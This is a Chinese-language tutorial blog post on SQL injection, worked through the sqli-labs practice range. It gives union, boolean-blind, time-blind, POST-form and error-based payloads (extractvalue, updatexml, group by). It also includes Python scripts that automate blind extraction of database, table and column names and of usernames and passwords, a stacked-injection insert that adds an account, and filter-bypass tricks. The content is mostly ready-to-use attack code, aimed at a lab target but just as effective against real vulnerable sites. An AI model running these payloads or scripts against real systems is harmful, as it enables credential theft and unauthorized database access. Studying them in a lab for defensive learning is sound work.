---
title: sql注入
date: 2024-07-27 19:38:08
categories:
- WEB
tags:
- sql注入
- 注入
description: " "
---
&emsp;&emsp; 当用户输入账号和密码的时候，web应用会向后台数据库进行一个匹配，如果账号密码正确就会登入。而这个数据库例如MySQL,Oracle等一系列用的语句叫做sql语句，那么我们在传数据的时候，使用sql语句上传就会改变一个原有的结构，从而获取或修改数据库中的数据，而这个，就叫做sql注入。

## 前言
&emsp;&emsp;那么在做sql注入的时候，建议先看一下sql语句的基础语法，懂得基础才能理解得更加深刻,OK，在学这个之前，我们要搭配着靶场去使用，实践出来的效果更佳。点击[靶场环境搭建](https://blog.csdn.net/Joker_Dgh/article/details/123913722),当做一个游戏去玩，通关即为胜利（注意php版本要选择5.x版本）

## sql注入基础
&emsp;&emsp;我们就直接讲思路什么的了，语法基础和逻辑自行去b站了解。

## get请求
### 判断注入点
&emsp;&emsp;注入点分为数字型和字符型（输入字符默认为字符型）。两者的判断方式可以<font color=blue>用id=2-1来测试，如果是数字型的，回显的样式应该是id=1的情况，如果是字符型的，回显的样式应该是id=2的情况。</font>
![sql1-1](/images/sql/sql1-1.png)
&emsp;&emsp;这是id为1时的name和password
![sql1-2](/images/sql/sql1-2.png)
&emsp;&emsp;这是id为2时的name和password
![sql1-2-1](/images/sql/sql1-2-1.png)
&emsp;&emsp;这是id为2-1的name和password，很明显，和2的情况是一样的，所以这是字符型。

### 判断闭合方式
&emsp;&emsp;如果是字符型的话，根据语法，既然我们要重新构造一个语句，我们就得把后面的原本语句注释掉，因此我们数值后面需要添加闭合符，语句结尾需要添加注释符。闭合方式有
![数值闭合](/images/sql/数值闭合.png)
![字符闭合](/images/sql/字符闭合.png)
&emsp;&emsp;然而注释符目前只找到--+(-- q),#,%23这三种，判断的方法也很简单，如果<font color=red>所使用的闭合方式结果一样，那么说明不是该闭合方式。反之就是(同时还应判断是否需要添加括号)</font>打个比方，如果输入1"and 1=1-- q 和 1"and 1=2 --q 两次的回显结果一样，说明闭合方式不是双引号，其他同理。原理就不用多讲了吧，如果真是闭合符的话，and后面一真一假，后者肯定报错。
![and1=1](/images/sql/and1=1.png)
![and1=2](/images/sql/and1=2.png)
&emsp;&emsp;回显不一样，闭合符号为’（可以试试双引号是否回显是一样）

### 联合注入
&emsp;&emsp;ok啊，知道闭合方式和注释符之后，我们就可以往期间穿插语句了，那么我们就要学习sql注入的第一步联合注入。  
&emsp;&emsp;第一步:order by X判断列数，X递增往上加，<font color=blue>如果报错就是超过列数，显示正常就是没有超出，就继续往上加，直到报错退回来。</font>
![orderby](/images/sql/orderby.png)
&emsp;&emsp;可以看到4报错了，我们就退回来，说明列数只有三列。
```
?id=1' order by 3--+
```
&emsp;&emsp;第二步:union select X判断显示位，先输入1,2,3……看页面回显，能回显的我们就可以再改成语句。当然做这一步的时候，我们需要让前面数据库查询不到，从而列举出后面的列。通常改为负数就可。
![select](/images/sql/select.png)
&emsp;&emsp;可以看到2，3被回显出来，因此可以在2，3的位置插入语句。
```
?id=-1'union select 1,2,3--+
```
&emsp;&emsp;第三步:爆库(不爆也行)，爆表，爆列，爆字段。可以插入语句了，我们就使用固定公式就可以了。  
&emsp;&emsp;爆库,这里为security
![sql1-爆库](/images/sql/sql1-爆库.png)
```
?id=-1'union select 1,database(),3--+
```
&emsp;&emsp;爆表，这里emails,referers,uagents,users
![sql1-爆表1](/images/sql/sql1-爆表1.png)
&emsp;&emsp;这是因为2列语句太长了，我们放3列就行
![sql1-爆表2](/images/sql/sql1-爆表2.png)
```
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```
&emsp;&emsp;爆列，注意，表名也就是table_name要视情况而判断，要看哪个表就用查哪个表.
![sql1-爆列](/images/sql/sql1-爆列.png)
```
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```
&emsp;&emsp;爆字段，直接查询你要想要看的数据，例如有flag的话，就可以直接查了。
![sql1-爆字段](/images/sql/sql1-爆字段.png)
```
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```
&emsp;&emsp; * from table_name也可以全部列出来。

### 布尔盲注
&emsp;&emsp;学会了联合注入的方法后，前四关无压力，第五关测试的时候发现查询不到结果，像是这种的，我们可以使用布尔盲注，区别就是盲注不是返回查询到的结果，而只是返回查询是否成功，即<font color=red>返回查询语句的布尔值</font>,也就是真和假的判断。因为我们对内部数据库的信息了解甚少，所以盲注没有固定的公式，需要进行一定的修改。大致思路是这样的:
```
爆库名长度
根据库名长度爆库名
对当前库爆表数量
根据库名和表数量爆表名长度
根据表名长度爆表名
对表爆列数量
根据表名和列数量爆列名长度
根据列名长度爆列名
根据列名爆数据值
```
&emsp;&emsp;总结来说就是跟上面差不多的，爆库，爆表，爆列，爆字段。只不过这个更加细节一点，用的方法也不一样。常用函数`substr(str,from,length)`返回从下标为from截取长度为length的str子串。其中，<font color=black>首字符下标为1</font>,`length(str)`返回str串长度。  
&emsp;&emsp;大致步骤如下:
```
?id=1'and length((select database()))>9--+
#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
?id=1'and ascii(substr((select database()),1,1))=115--+
#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
 
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
判断所有表名字符长度。
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
逐一判断表名
 
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
判断所有字段名的长度
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
逐一判断字段名。
 
 
?id=1' and length((select group_concat(username,password) from users))>109--+
判断字段内容长度
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
逐一检测内容。
 
 ```
&emsp;&emsp;要根据注释去修改数值和属性。（建议手打和尝试修改后的变化，更加有印象）<font color=red>注:这是闭合符的判断还是和前面的一样。</font>
&emsp;&emsp;这里是用等于号测试的，<font color=blue>细节1:先测试1=1为真的回显，再看length执行的时候为真的页面，这里等于8是说明数据库的长度为8</font>
![sql5-length](/images/sql/sql5-length.png)

&emsp;&emsp;得出来长度后，我们就可以用ascii码去遍历一下，人工是不是很麻烦，拜托，咱们是计算机，要用编程~当然，数据库我们同样也可以用脚本跑出来。
```
import requests

url = 'http://sql-labs:3601/Less-5/'  # 目标URL
flag = "You are in..."  # 设置一个回显成功的字样


def get_database_length():
    global url, flag  # 全局变量
    length = 1
    while (1):
        payload = f"?id=1' and length((select database()))={length}--+"
        response = requests.get(url + payload).text
        if flag not in response:
            length += 1
        else:
            print("success")
            break
    print("数据库长度为", length)
    return length


if __name__ == "__main__":
    print("获取数据库长度")
    length = get_database_length()
```
&emsp;&emsp;回显长度为8，下一步遍历获取数据库名。根据上面提供的公式想好要改变哪些数，<font color=blue>细节2:ascii常规字符为0-127区间内，其中A(65)-Z(90),a(97)-z(122)</font>
```
def get_database_length2(database_length):
    global flag, url
    database = ""
    for i in range(1, database_length + 1):
        for j in range(65,122):
            payload = f"?id=1' and ascii(substr((select database()),{i},1))={j}--+"
            response = requests.get(url + payload).text
            if flag in response:
                database += chr(j)
                print("数据库名为",database)
                break
    return database


if __name__ == "__main__":
    print("获取数据库长度")
    length = get_database_length()
    print("获取数据库名")
    length_name = get_database_length2(length)
```
&emsp;&emsp;遍历出数据库名security，那么其他同理，只要将payload改一下下就可以了。判断表长度
```
def get_table_length():
    global flag, url
    length = 1
    while(1):
        payload = f"?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={length}--+"
        response = requests.get(url + payload).text
        if flag not in response:
            length += 1
        else:
            print("success")
            break
    print("表长度为",length)
    return length

if __name__ == "__main__":
    print("获取数据库长度")
    length = get_database_length()
    print("获取数据库名")
    length_name = get_database_length2(length)
    print("获取表长度")
    table_length = get_table_length()
```
&emsp;&emsp;跟获取数据库长度是一样的，注意payload就行，得出表长度为29，下一步表名，老样子，改payload
```
def get_table_name(table_length):
    global flag, url
    table_name = ""
    for i in range(1, table_length + 1):
        for j in range(33,122):
            payload = f"?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={j}--+"
            response = requests.get(url + payload).text
            if flag in response:
                table_name += chr(j)
                print("表名为",table_name)
                break
    return table_name

if __name__ == "__main__":
    print("获取数据库长度")
    length = get_database_length()
    print("获取数据库名")
    length_name = get_database_length2(length)
    print("获取表长度")
    table_length = get_table_length()
    print("获取表名")
    table_name = get_table_name(table_length)
```
&emsp;&emsp;获取表名为emails,referers,uagents,users，<font color=blue>细节3:因为表名不止一个，中间的分隔符,我们可以把ASCII的范围调到33-127</font>如果觉得运行较慢的话，可以使用算法加工，例如二分法,或者把获取到的信息注释掉。下一步，爆列。
```
def get_column_length():
    global flag,url
    length = 1
    while(True):
        payload = f"?id=1'and length((select group_concat(column_name) from information_schema.columns where table_name='users'))={length}--+"
        response = requests.get(url + payload).text
        if flag not in response:
            length += 1
        else:
            print("success")
            break
    print("表长度为", length)
    return length

def get_column_name(column_length):
    global flag,url
    column_name = ""
    for i in range(1, column_length + 1):
        for j in range(33,122):
            payload = f"?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{i},1))={j}--+"
            response = requests.get(url + payload).text
            if flag in response:
                column_name += chr(j)
                print("表名为",column_name)
                break
    return column_name

if __name__ == "__main__":
    print("获取数据库长度")
    length = get_database_length()
    print("获取数据库名")
    length_name = get_database_length2(length)
    print("获取表长度")
    table_length = get_table_length()
    print("获取表名")
    table_name = get_table_name(table_length)
    print("获取列长度")
    column_length = get_column_length()
    print("获取列名")
    column_name = get_column_name(column_length)
```
![sql5-column](/images/sql/sql5-column.png)
&emsp;&emsp;最后爆字段
```
def get_column_id():
    global flag,url
    length = 1
    id = ""
    while(True):
        payload = f"?id=1'and length((select group_concat(id) from users))={length}--+"
        response = requests.get(url + payload).text
        if flag not in response:
            length += 1
        else:
            break
    print("id长度为",length)
    for i in range(1,length+1):
        for j in range(33,122):
            payload = f"?id=1'and ascii(substr((select group_concat(id) from users),{i},1))={j}--+"
            response = requests.get(url + payload).text
            if flag in response:
                id += chr(j)
                break
    print("id为",id)
    return id

if __name__ == "__main__":
    # print("获取数据库长度")
    # length = get_database_length()
    # print("获取数据库名")
    # length_name = get_database_length2(length)
    # print("获取表长度")
    # table_length = get_table_length()
    # print("获取表名")
    # table_name = get_table_name(table_length)
    # print("获取列长度")
    # column_length = get_column_length()
    # print("获取列名")
    # column_name = get_column_name(column_length)
    print("获取字段")
    id = get_column_id()
```
![sql5-id](/images/sql/sql5-id.png)

### 时间盲注
&emsp;&emsp;当做到第九关的时候，测试闭合符不管输入什么页面显示的东西都是一样的，这个时候就得考虑时间盲注了，我们就可以使用sleep()来使页面延迟，从而肉眼分辨真假，时间盲注和布尔盲注两种没有多大的区别，只不过时间盲注多了<font color=red>if和sleep函数</font>,if(a,sleep(3),1)如果a结果为true，那么执行sleep(3)页面延迟10秒，反之执行1，无延迟。 
&emsp;&emsp;测试是否可以执行时间盲注的方法，判断闭合符的方法也是一样的，修改1=1，如果假和真都无延迟就说明是闭合符的问题，一般只要真有延迟就说明闭合符正确，
```
?id=1' and if(1=1,sleep(5),1)--+
```
&emsp;&emsp;行，既然知道了，那么大致的payload应该也就出来了。既然有延迟，就说明浏览器的timeout就会有增加，我们就只需要调整一下布尔函数的py就可以了。
```
import requests
url = 'http://sql-labs:3601/Less-9/'  # 目标URL
def get_database_length():
    global url  # 全局变量
    length = 1
    while (1):
        payload = f"?id=1' and if(length((select database()))={length},sleep(3),1)--+"
        try:  #try-except 块捕获任何可能的异常，如网络超时或连接错误。
            response = requests.get(url + payload,timeout=3).text #设置超时
        except Exception:
            print("success")  #如果超时了说明正确，返回success
            break
        else:
            length += 1
    print("数据库长度为", length)
    return length
```
&emsp;&emsp;通过try-except获取超时的信息，从而判断出数据库的长度。
![sql9-time1](/images/sql/sql9-time1.png)
&emsp;&emsp;那么同理加if和try-except以及timeout从布尔盲注的脚本进行修改就可以取出数据库名。
```
def get_database_length2(database_length):
    global url
    database = ""
    for i in range(1, database_length + 1):
        for j in range(65,122):
            payload = f"?id=1' and if(ascii(substr((select database()),{i},1))={j},sleep(3),1)--+"
            try:
                response = requests.get(url + payload,timeout=3).text
            except Exception:
                database += chr(j)
                print("数据库名为",database)
                break
    return database
```
&emsp;&emsp;其余的跟这两种的修改方案一样，我就不一一放出来了，最终可以得到字段
![sql9-time2](/images/sql/sql9-time2.png)

## post请求
### 联合注入
&emsp;&emsp;做到第十一关，请求方式变为了post请求，变成了更为常见的类型，要求输入用户名和密码，那么大概的sql语句就是username=[] and password=[],我们也可以测试闭合符看报错（如果有的话）。
![sql11-post](/images/sql/sql11-post.png)
&emsp;&emsp;如果我们输入闭合符有报错的，就说明有回显，就可以利用联合注入。
![sql11-1](/images/sql/sql11-1.png)
&emsp;&emsp;报错的这段我们分析一下就知道为单引号闭合，我们输入1'是后面闭合变成了双引号，那么就改变了原语句而报错。没分析明白的再去看看基础。  
&emsp;&emsp;知道了sql语句我们就可以构造一个恒成立的sql语句，也成为万能密码，具体可转至[万能密码](https://blog.csdn.net/hxhxhxhxx/article/details/108020010)  
&emsp;&emsp;我用的是<font color=red>1' or 1=1# </font>这个得根据语句进行判断，实在不知道就用BP爆破，这里post请求用的注释符通常用#，具体原因我也不知道，谁懂了可以举个爪。
![sql11-2](/images/sql/sql11-2.png)
&emsp;&emsp;条件达成，联合注入即可。

### 布尔盲注
&emsp;&emsp;注入成功有页面变化无回显，可以使用布尔盲注，只不过这是post请求的，对应的脚本也需要修改。<font color>细节:回显成功的参数是个图片，ctrl+U能收集到信息参数</font>  
![sql13-post](/images/sql/sql13-post.png)
```
url = 'http://sql-labs:3601/Less-13/'  # 目标URL
flag = "../images/flag.jpg"  # 设置一个回显成功的字样
data= {
    "uname" : "a') or 1 #",
    "passwd" : "1",
    "submit" : "Submit"
} #post参数

def get_database_length():
    global url, flag  # 全局变量
    length = 1
    while (1):
        payload = f"1') or length((select database()))={length}#"
        data["uname"] = payload
        response = requests.post(url, data=data).text
        if flag not in response:
            length += 1
        else:
            print("success")
            break
    print("数据库长度为", length)
    return length
```
&emsp;&emsp;照着修改一下即可。剩下的也是一样的，测长和字符的形式是一样，我就例举两个就行。
```
def get_database_length2(database_length):
    global flag, url
    database = ""
    for i in range(1, database_length + 1):
        for j in range(65,122):
            payload = f"1') or ascii(substr((select database()),{i},1))={j}#"
            data["uname"] = payload
            response = requests.post(url,data=data).text
            if flag in response:
                database += chr(j)
                print("数据库名为",database)
                break
    return database
```

###  报错注入
&emsp;&emsp;第十七关是一个密码重置界面，用户名已经找到，密码不知道，这一题还对用户名进行了检查，就只能对密码入手，如果布尔盲注和时间盲注都不能使用，就可以使用报错注入。就直接给固定公式了，原理可以再去搜索一下。

#### extractvalue报错注入
```
1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库
 
1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)))# 
 爆字段名
 
1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
 ```

#### updatexml报错注入
```
123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
 
  
123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
   爆字段名
 
123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
爆密码该格式针对mysql数据库。
爆其他表就可以，下面是爆emails表
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
 
1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
```

#### group by报错注入
```
123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
 
 
1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
 
  
1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
 
1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
 ```

 ## 绕过
 &emsp;&emsp;至此大多数的sql注入方法，还有一个堆叠注入，像是这样的用法`login_user=1&login_password=1';insert into users(id,username,password) values ('39','less30','123456')--+&mysubmit=Login`，这个简单去了解一下即可。下面是一些特殊情况的绕过。

 ### 替换绕过
 &emsp;&emsp;很常用的方法，双写穿插。
 ```
 or     --> oorr
 and    --> aandnd
 union  --> uunionnion
 select --> seselectlect
 ... ...
```
 
 ### 大小写绕过
 &emsp;&emsp;在实战中，这种方法并不常见了
 ```
 or     --> Or
 select --> SEleCt
 union  --> UniOn
 and    --> aND
```
 
 ### 空格绕过
 &emsp;&emsp;很常见的一种，也很烦，在每一个空格处替换,报错注入使用空格比较少，也可使用此方法。
 ```
 %09 TAB键（水平）
 %0a 换行
 %0c 换页
 %0d return功能
 %0b TAB键（垂直）
 %20,%a0,+ 空格
 /**/ 注释
 ```

### 逻辑运算符绕过
```
and --> &&
or  --> ||
```

 ### 宽字节绕过
 &emsp;&emsp;当斜杠，单引号和双引号过滤或者转义的时候，我们可以采用宽字节绕过。当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。也就是全角和半角。

### 编码绕过
&emsp;&emsp;很常见的绕过手段了，十六进制编码就行。

#### 结语
&emsp;&emsp;至此，手动sql注入已经成功出师，关于sql注入，还可以使用sqlmap工具。转至[sqlmap](/2024/8/3/sqlmap/)去学习一下吧。